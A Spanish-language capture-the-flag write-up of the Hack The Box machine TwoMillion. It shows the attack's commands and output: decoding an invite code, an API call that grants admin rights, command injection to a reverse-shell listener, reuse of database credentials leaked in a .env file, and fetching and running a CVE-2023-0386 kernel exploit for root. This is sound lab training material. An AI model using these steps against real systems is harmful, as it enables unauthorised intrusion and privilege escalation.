---
title: TwoMillion
description: TwoMillion es una máquina Linux de dificultad Fácil, lanzada para celebrar que HackTheBox alcanzó los 2 millones de usuarios. La máquina utiliza una versión antigua de la plataforma de HackTheBox que incluye un antiguo código de invitación obsoleto. Al hackear el código de invitación, se puede crear una cuenta en la plataforma. Esta cuenta permite explorar varios endpoints de la API, uno de los cuales puede usarse para elevar los privilegios del usuario a Administrador. Con acceso administrativo, el usuario puede hacer una inyección de comandos en el endpoint de generación de VPN para obtener un shell del sistema. Se encuentra un archivo .env con credenciales de la base de datos, y debido a la reutilización de contraseñas, los atacantes pueden iniciar sesión como usuario admin en la máquina. Además, el kernel del sistema está desactualizado, y se puede usar CVE-2023-0386 para obtener un shell con privilegios de root.
date: 2024-07-18
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-twomillion/twomillion_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - fuzzing_web
  - ssh
  - http
  - tcp
  - os_command_injection
  - api
  - misconfigurations
  - suid
  - capabilities
  - cve
  - devtools
  - information_gathering
  - web_analysis
  - misconfiguration_exploitation
  - foothold
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/twomillion:-$ ping -c 1 10.10.11.221
PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.
64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=285 ms

--- 10.10.11.221 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 284.705/284.705/284.705/0.000 ms
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221 -oG map1
Host: 10.10.11.221 ()   Status: Up
Host: 10.10.11.221 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.221 -oN map2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; 
protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ echo '10.10.11.221\t2million.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ whatweb 2million.htb
http://2million.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ dirsearch -u http://2million.htb/ -x 400,403,404
200 -    4KB - /login
200 -    4KB - /register
200 -	 4KB - /invite
```
---
## Web Analysis

![](/assets/img/htb-writeup-twomillion/twomillion1_1.png)
![](/assets/img/htb-writeup-twomillion/twomillion1_3.png)
![](/assets/img/htb-writeup-twomillion/twomillion2_1.png)

Se puede ver en el código fuente de '2million.htb/invite', su funcion es validar un código de invitación mediante una solicitud AJAX al servidor. Dependiendo de la respuesta del servidor, el usuario será redirigido a la página de registro '/register' si el código es válido, o se le mostrará un mensaje de error si el código no es válido o si ocurre algún problema durante la solicitud.

![](/assets/img/htb-writeup-twomillion/twomillion1_4.png)

El codigo fuente esta cargando dos archivos, uno de los cuales parece tener una pista. 

Al cargar el archivo '2million.htb/js/inviteapi.min.js' veo el siguiente codigo.

![](/assets/img/htb-writeup-twomillion/twomillion2_2.png)

Pego el codigo en Javascript Beautifier para hacerlo mas legible.

<https://beautifier.io/>

![](/assets/img/htb-writeup-twomillion/twomillion2_3.png)

---
## Misconfiguration Exploitation

Dentro de la funcion 'makeInviteCode', resalta una API '/api/v1/invite/how/to/generate' la cual permite tramitar una peticion 'POST'.

```terminal
/home/kali/Documents/htb/machines/twomillion:-$ curl -X POST 2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
Parte de la respuesta esta encriptada en 'ROT13'.

```terminal
/home/kali/Documents/htb/machines/twomillion:-$ echo 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr' | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ curl -X POST 2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"RUpOQTYtNlBVMTUtN0JYTkotRlpCVkc=","format":"encoded"}}

/home/kali/Documents/htb/machines/twomillion:-$ echo RUpOQTYtNlBVMTUtN0JYTkotRlpCVkc= | base64 --decode
EJNA6-6PU15-7BXNJ-FZBVG
```
Para pegar el codigo en '2million.htb/invite' y registrarme, utilizo 'Dev Tools'.

Debido a que el 'input' esta asignado como 'readonly' no se puede introducir el 'invite code'.

![](/assets/img/htb-writeup-twomillion/twomillion2_4.png)

Solo al borrar este valor 'readonly' se podra pasar el codigo.

![](/assets/img/htb-writeup-twomillion/twomillion2_5.png)

Una vez logueado, investigo la pagina

![](/assets/img/htb-writeup-twomillion/twomillion3_1.png)

Encuentro el boton 'Connection Pack' y su respectivo endpoint '/api/v1/user/vpn/generate'.

![](/assets/img/htb-writeup-twomillion/twomillion3_2.png)

Reviso si puedo listar el contenido de '/api'.

![](/assets/img/htb-writeup-twomillion/twomillion3_3.png)

Utilizo BurpSuite para una invetigacion mas profunda. Y puedo ver varios endopoints bajo autorizacion de admin.

![](/assets/img/htb-writeup-twomillion/twomillion3_4.png)

El endpoint '/api/v1/admin/auth' verifica si el usuario es 'admin'.

![](/assets/img/htb-writeup-twomillion/twomillion3_5.png)

Y el endpoint '/api/v1/admin/settings/update' me permite actualizar los ajustes de usuario.

Pasando los valores correctos, puedo actualizar mi usuario como 'admin'.

```terminal
/home/kali/Documents/htb/machines/twomillion:-$ curl -X PUT -d '{"email":"user@user.com", "is_admin": 1}' -H "Content-Type: application/json" -H "Cookie: PHPSESSID=4osdeihvi15jqfu5t1jo99e17j" http://2million.htb/api/v1/admin/settings/update
{"id":16,"username":"user","is_admin":1}
```

![](/assets/img/htb-writeup-twomillion/twomillion3_6.png)

Intercepto la peticion de la API /api/v1/admin/vpn/generate.

![](/assets/img/htb-writeup-twomillion/twomillion3_7.png)

Cambio el metodo de la peticion de GET a POST.

![](/assets/img/htb-writeup-twomillion/twomillion3_8.png)

Completo los parametros que el servidor me solicita, 'Content-Type', 'Content-Length', etc.

Con esto soy capaz de inyectar comandos.

![](/assets/img/htb-writeup-twomillion/twomillion3_9.png)

---
## Foothold
		
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ nc -nlvkp 5555
	listening on [any] 5555 ...
```

![](/assets/img/htb-writeup-twomillion/twomillion3_10.png)

```terminal
	...connect to [10.10.16.92] from (UNKNOWN) [10.10.11.221] 43926

www-data@2million:~/html$ whoami
www-data
```

---
## Lateral Movement

```terminal
www-data@2million:~/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash

www-data@2million:~/html$ ls -al
-rw-r--r--  1 root root   87 Jun  2  2023 .env

www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
```terminal
/home/kali/Documents/htb/machines/twomillion:-$ ssh admin@10.10.11.221
admin@10.10.11.221's password: SuperDuperPass123

admin@2million:~$ cat user.txt
```

---
## Privilege Escalation

```terminal
admin@2million:~$ find / -user admin -type f 2>/dev/null
/var/mail/admin
```

![](/assets/img/htb-writeup-twomillion/twomillion4_1.png)

<https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#check-if-your-system-is-vulnerable>

```terminal
admin@2million:~$ uname -r
5.15.70-051570-generic

admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
Parece que el sistema es vulnerable, CVE-2023-0386.

<https://nvd.nist.gov/vuln/detail/CVE-2023-0386>

```terminal

/home/kali/Documents/htb/machines/twomillion:-$ git clone https://github.com/sxlmnwb/CVE-2023-0386?source=post_page-----1b06035e0b99--------------------------------
/home/kali/Documents/htb/machines/twomillion:-$ tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386/

/home/kali/Documents/htb/machines/twomillion:-$ python3 -m http.server
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

admin@2million:~$ wget 10.10.16.92:8000/CVE-2023-0386.tar.bz2
‘CVE-2023-0386.tar.bz2’ saved [29763/29763]

	...10.10.11.221 - - [18/Jul/2024 14:47:51] "GET /CVE-2023-0386.tar.bz2 HTTP/1.1" 200 -
```
```terminal
admin@2million:~$ tar -xjvf CVE-2023-0386.tar.bz2

admin@2million:~/CVE-2023-0386$ make all
```
Segun las instrucciones del PoC, primero corro el siguiente comando.

```terminal
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
```
Y en otra terminal, paso el siguiente comando.
```terminal
admin@2million:~/CVE-2023-0386$ ./exp

root@2million:~/CVE-2023-0386# cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/547" target="_blank">***Litio7 has successfully solved Twomillion from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
